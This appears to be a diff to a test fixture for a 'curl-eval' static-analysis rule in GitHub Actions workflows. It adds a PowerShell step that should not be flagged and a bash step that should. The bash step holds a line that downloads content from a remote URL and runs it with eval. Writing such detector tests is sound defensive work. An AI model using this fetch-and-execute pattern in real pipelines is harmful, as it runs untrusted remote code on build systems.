@@ -23,3 +23,18 @@ jobs:
         run: |
           CONTENTS=$(curl https://blah.com)
           eval $CONTENTS
+
+      - name: PowerShell step must not be bash-parsed
+        shell: pwsh
+        # ok: curl-eval
+        run: |
+          $cacheDirs = @("D:\cache")
+          foreach ($dir in $cacheDirs) {
+            New-Item -ItemType Directory -Path $dir -Force | Out-Null
+          }
+      - name: explicit bash still detected
+        shell: bash
+        # ruleid: curl-eval
+        run: |
+          CONTENTS=$(curl https://blah.com)
+          eval $CONTENTS
